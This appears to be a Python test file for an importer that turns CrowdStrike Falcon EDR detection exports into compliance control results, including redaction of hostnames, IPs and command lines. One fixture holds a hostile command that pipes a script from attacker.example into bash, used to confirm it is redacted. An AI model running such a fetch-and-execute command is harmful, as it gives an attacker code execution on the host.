"""Tests for the CrowdStrike Falcon EDR importer."""

from __future__ import annotations

import json
from typing import Any

from ancilis.importers import CrowdStrikeImporter


# ---------------------------------------------------------------------------
# Fixture helpers
# ---------------------------------------------------------------------------


def _behavior(
    *,
    behavior_id: str = "beh-1",
    name: str = "PowerShell encoded command",
    tactic: str = "Execution",
    technique: str = "T1059",
    scenario: str = "Suspicious encoded PowerShell observed on host",
    objective: str = "Falcon Detection Method",
    confidence: int = 80,
) -> dict[str, Any]:
    return {
        "behavior_id": behavior_id,
        "name": name,
        "tactic": tactic,
        "technique": technique,
        "scenario": scenario,
        "objective": objective,
        "confidence": confidence,
    }


def _event(
    *,
    event_id: str = "evt-001",
    event_time: str = "2026-05-09T12:00:00Z",
    event_type: str = "DetectionSummaryEvent",
    cid: str = "cid-1234567890",
    aid: str = "aid-abcdef",
    hostname: str = "agent-svc-prod-1.corp.example.com",
    platform: str = "Linux",
    severity: int = 4,
    severity_label: str = "High",
    tactic: str | None = None,
    technique: str | None = None,
    detection_id: str = "det-001",
    status: str = "new",
    behaviors: list[dict[str, Any]] | None = None,
    user_name: str = "agent-svc",
    user_id: str = "u-123456789012345",
    ioc_type: str | None = "hash",
    ioc_value_length: int = 64,
    command_line_length: int = 512,
    command_line: str | None = None,
    process_name: str = "python3",
    parent_process_name: str = "agent-orchestrator",
    is_managed_endpoint: bool = True,
    is_authorized_response: bool = True,
    actions_taken: list[str] | None = None,
    machine_domain: str = "corp.example.com",
    external_ip: str = "203.0.113.5",
    local_ip: str = "10.0.0.1",
    sensor_id: str = "sensor-9999abcd",
    extra: dict[str, Any] | None = None,
) -> dict[str, Any]:
    if behaviors is None:
        behaviors = [_behavior()]
    if actions_taken is None:
        actions_taken = []
    obj: dict[str, Any] = {
        "event_id": event_id,
        "event_time": event_time,
        "event_type": event_type,
        "cid": cid,
        "aid": aid,
        "hostname": hostname,
        "platform": platform,
        "severity": severity,
        "severity_label": severity_label,
        "tactic": tactic,
        "technique": technique,
        "detection_id": detection_id,
        "status": status,
        "behaviors": behaviors,
        "user_name": user_name,
        "user_id": user_id,
        "ioc_type": ioc_type,
        "ioc_value_length": ioc_value_length,
        "command_line_length": command_line_length,
        "process_name": process_name,
        "parent_process_name": parent_process_name,
        "is_managed_endpoint": is_managed_endpoint,
        "is_authorized_response": is_authorized_response,
        "actions_taken": list(actions_taken),
        "machine_domain": machine_domain,
        "external_ip": external_ip,
        "local_ip": local_ip,
        "sensor_id": sensor_id,
    }
    if command_line is not None:
        obj["command_line"] = command_line
    if extra:
        obj.update(extra)
    return obj


def _wrap(events: list[dict[str, Any]]) -> str:
    return json.dumps({"events": events})


def _control_ids(result) -> list[str]:
    return [cr.control_id for cr in result.control_results]


def _signals(result) -> list[str]:
    return [cr.evidence_data.get("signal") for cr in result.control_results]


def _find_signal(results: list, signal: str):
    """Return the first ControlResult across all EvaluationResults for ``signal``."""
    for r in results:
        for cr in r.control_results:
            if cr.evidence_data.get("signal") == signal:
                return cr
    return None


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------


def test_critical_detection_open_fails():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [_event(severity=5, severity_label="Critical", status="new")]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "critical_open")
    assert cr is not None
    assert cr.control_id == "DE-01"
    assert cr.result == "FAIL"


def test_high_detection_open_fails():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [_event(severity=4, severity_label="High", status="in_progress")]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "high_open")
    assert cr is not None
    assert cr.control_id == "DE-01"
    assert cr.result == "FAIL"


def test_high_closed_true_positive_pr05_fail():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                severity=4,
                severity_label="High",
                status="closed",
                extra={"disposition": "true_positive"},
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "high_closed_true_positive")
    assert cr is not None
    assert cr.control_id == "PR-05"
    assert cr.result == "FAIL"


def test_high_false_positive_pr05_pass():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [_event(severity=4, severity_label="High", status="false_positive")]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "high_closed_false_positive")
    assert cr is not None
    assert cr.control_id == "PR-05"
    assert cr.result == "PASS"


def test_exfiltration_tactic_fails():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                severity_label="High",
                status="new",
                tactic="Exfiltration",
                technique="T1041",
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "tactic_exfiltration")
    assert cr is not None
    assert cr.control_id == "PR-04"
    assert cr.result == "FAIL"


def test_credential_access_tactic_fails():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                severity_label="High",
                status="new",
                tactic="Credential Access",
                technique="T1003",
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "tactic_credential_access")
    assert cr is not None
    assert cr.control_id == "PR-01"
    assert cr.result == "FAIL"


def test_lateral_movement_tactic_fails():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                severity_label="High",
                status="new",
                tactic="Lateral Movement",
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "tactic_lateral_movement")
    assert cr is not None
    assert cr.control_id == "PR-02"
    assert cr.result == "FAIL"


def test_initial_access_high_fails():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                severity_label="High",
                status="new",
                tactic="Initial Access",
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "tactic_initial_access_high")
    assert cr is not None
    assert cr.control_id == "PR-01"
    assert cr.result == "FAIL"


def test_technique_t1041_exfil_fails():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                severity_label="Medium",
                status="in_progress",
                tactic="Command and Control",
                technique="T1041",
                behaviors=[_behavior(technique="T1041", tactic="Command and Control")],
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "mitre_technique_pr04")
    assert cr is not None
    assert cr.control_id == "PR-04"
    assert cr.result == "FAIL"
    assert "T1041" in cr.evidence_data.get("mitre_techniques", [])


def test_technique_t1059_interpreter_pr03_fails():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                severity_label="Medium",
                status="in_progress",
                technique="T1059",
                behaviors=[_behavior(technique="T1059")],
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "mitre_technique_pr03")
    assert cr is not None
    assert cr.control_id == "PR-03"
    assert cr.result == "FAIL"


def test_low_confidence_autonomous_flags():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                severity_label="Medium",
                status="in_progress",
                is_authorized_response=True,
                actions_taken=["kill_process"],
                behaviors=[_behavior(confidence=30)],
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "low_confidence_autonomous")
    assert cr is not None
    assert cr.control_id == "PR-03"
    assert cr.result == "FLAG"
    assert cr.evidence_data["min_behavior_confidence"] == 30


def test_isolate_host_without_authz_fails():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                severity_label="High",
                status="in_progress",
                is_authorized_response=False,
                actions_taken=["isolate_host"],
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "isolate_host_no_authz")
    assert cr is not None
    assert cr.control_id == "PR-02"
    assert cr.result == "FAIL"


def test_unmanaged_endpoint_on_prod_flags():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                hostname="prod-db-1",
                is_managed_endpoint=False,
                severity_label="Medium",
                status="new",
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "unmanaged_production_endpoint")
    assert cr is not None
    assert cr.control_id == "PR-01"
    assert cr.result == "FLAG"
    assert cr.evidence_data["production_pattern_matched"] == "prod*"


def test_identity_protection_high_fails():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                event_type="AuthActivityAuditEvent",
                severity_label="High",
                status="new",
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "identity_protection_high")
    assert cr is not None
    assert cr.control_id == "PR-01"
    assert cr.result == "FAIL"


def test_repeated_fp_synthetic():
    importer = CrowdStrikeImporter(repeated_fp_threshold=2)
    behaviors = [_behavior(name="Noisy Browser Heuristic")]
    events = [
        _event(
            event_id=f"evt-fp-{i}",
            severity_label="Medium",
            status="false_positive",
            behaviors=behaviors,
        )
        for i in range(5)
    ]
    results = importer.parse_string(_wrap(events))
    cr = _find_signal(results, "repeated_fp_synthetic")
    assert cr is not None
    assert cr.control_id == "PR-03"
    assert cr.result == "FLAG"
    # Behavior name must be redacted (length+sha), never raw.
    redacted = cr.evidence_data["behavior_name_redacted"]
    assert redacted["present"] is True
    assert "sha256" in redacted
    assert "Noisy Browser" not in json.dumps(cr.evidence_data)


def test_cross_host_attack_synthetic():
    importer = CrowdStrikeImporter(cross_host_threshold=2)
    events = [
        _event(
            event_id=f"evt-spread-{i}",
            detection_id="det-shared",
            hostname=f"agent-svc-prod-{i}",
            severity_label="High",
            status="in_progress",
        )
        for i in range(5)
    ]
    results = importer.parse_string(_wrap(events))
    cr = _find_signal(results, "cross_host_attack_synthetic")
    assert cr is not None
    assert cr.control_id == "DE-01"
    assert cr.result == "FAIL"
    assert cr.evidence_data["distinct_host_count"] == 5


def test_recurring_tp_synthetic():
    importer = CrowdStrikeImporter(recurring_tp_threshold=2)
    behaviors = [_behavior(name="Real-attack-pattern-X")]
    events = [
        _event(
            event_id=f"evt-tp-{i}",
            severity_label="High",
            status="true_positive",
            behaviors=behaviors,
        )
        for i in range(4)
    ]
    results = importer.parse_string(_wrap(events))
    cr = _find_signal(results, "recurring_tp_synthetic")
    assert cr is not None
    assert cr.control_id == "DE-01"
    assert cr.result == "FLAG"
    assert cr.evidence_data["true_positive_count"] == 4


def test_hostname_redacted():
    importer = CrowdStrikeImporter()
    payload = _wrap([_event(hostname="agent-svc-prod-secret-tenant-7")])
    results = importer.parse_string(payload)
    cr = results[0].control_results[0]
    redacted = cr.evidence_data["hostname_redacted"]
    assert redacted["present"] is True
    assert redacted["length"] == len("agent-svc-prod-secret-tenant-7")
    assert "sha256" in redacted
    # raw hostname must never appear anywhere in the evidence
    assert "secret-tenant" not in json.dumps(cr.evidence_data)


def test_command_line_not_stored():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                command_line="curl -s http://attacker.example/secret | bash",
                command_line_length=512,
            )
        ]
    )
    results = importer.parse_string(payload)
    ev = results[0].control_results[0].evidence_data
    # only length is preserved; raw command line is hashed away
    assert ev["command_line_length"] == 512
    redacted = ev["command_line_redacted"]
    assert redacted["present"] is True
    assert "attacker.example" not in json.dumps(ev)
    assert "secret | bash" not in json.dumps(ev)


def test_scenario_redacted():
    importer = CrowdStrikeImporter()
    secret_scenario = "Detected exfiltration of CUSTOMER-PII-DB to attacker.example"
    payload = _wrap(
        [
            _event(
                behaviors=[_behavior(scenario=secret_scenario)],
            )
        ]
    )
    results = importer.parse_string(payload)
    behaviors = results[0].control_results[0].evidence_data["behaviors"]
    assert len(behaviors) == 1
    assert behaviors[0]["scenario_redacted"]["present"] is True
    assert behaviors[0]["scenario_redacted"]["length"] == len(secret_scenario)
    assert "CUSTOMER-PII-DB" not in json.dumps(results[0].control_results[0].evidence_data)


def test_ip_redacted():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [_event(external_ip="203.0.113.42", local_ip="10.0.0.99")]
    )
    results = importer.parse_string(payload)
    ev = results[0].control_results[0].evidence_data
    assert ev["external_ip_masked"] == "203.0.113.0"
    assert ev["local_ip_masked"] == "10.0.0.0"
    # raw last octet must be gone
    assert "203.0.113.42" not in json.dumps(ev)
    assert "10.0.0.99" not in json.dumps(ev)


def test_user_id_and_sensor_id_truncated():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                user_id="user-supersecret-id-abcdef1234567890",
                sensor_id="sensor-supersecret-9999wxyz",
            )
        ]
    )
    results = importer.parse_string(payload)
    ev = results[0].control_results[0].evidence_data
    # last 8 chars only
    assert ev["user_id_last8"] == "34567890"
    assert ev["sensor_id_last8"] == "9999wxyz"
    assert "supersecret" not in json.dumps(ev)


def test_jsonl_parsing_supported():
    importer = CrowdStrikeImporter()
    lines = "\n".join(
        json.dumps(
            _event(
                event_id=f"evt-jsonl-{i}",
                severity_label="High",
                status="new",
            )
        )
        for i in range(3)
    )
    results = importer.parse_string(lines)
    # 3 events → at least 3 EvaluationResults
    assert len(results) >= 3
    high_open = [
        r for r in results
        for cr in r.control_results
        if cr.evidence_data.get("signal") == "high_open"
    ]
    assert len(high_open) == 3


def test_data_array_envelope_supported():
    importer = CrowdStrikeImporter()
    payload = json.dumps({"data": [_event(severity_label="Critical", status="new")]})
    results = importer.parse_string(payload)
    cr = _find_signal(results, "critical_open")
    assert cr is not None


def test_empty_export_emits_pass():
    importer = CrowdStrikeImporter()
    results = importer.parse_string("{}")
    assert len(results) == 1
    cr = results[0].control_results[0]
    assert cr.result == "PASS"
    assert cr.control_id == "PR-05"


def test_decision_in_enforce_mode_blocks_on_fail():
    importer = CrowdStrikeImporter(mode="enforce")
    payload = _wrap(
        [_event(severity_label="Critical", status="new")]
    )
    results = importer.parse_string(payload)
    # First result corresponds to the original event; should BLOCK.
    primary = results[0]
    assert primary.decision == "BLOCK"


def test_quarantine_file_captured_pass():
    importer = CrowdStrikeImporter()
    payload = _wrap(
        [
            _event(
                severity_label="Medium",
                status="in_progress",
                is_authorized_response=True,
                actions_taken=["quarantine_file"],
            )
        ]
    )
    results = importer.parse_string(payload)
    cr = _find_signal(results, "quarantine_file_captured")
    assert cr is not None
    assert cr.control_id == "PR-05"
    assert cr.result == "PASS"


def test_aid_and_cid_verbatim():
    importer = CrowdStrikeImporter()
    payload = _wrap([_event(aid="aid-pseudonymous-host", cid="cid-1234567890")])
    results = importer.parse_string(payload)
    ev = results[0].control_results[0].evidence_data
    # aid/cid are verbatim per spec
    assert ev["aid"] == "aid-pseudonymous-host"
    assert ev["cid"] == "cid-1234567890"
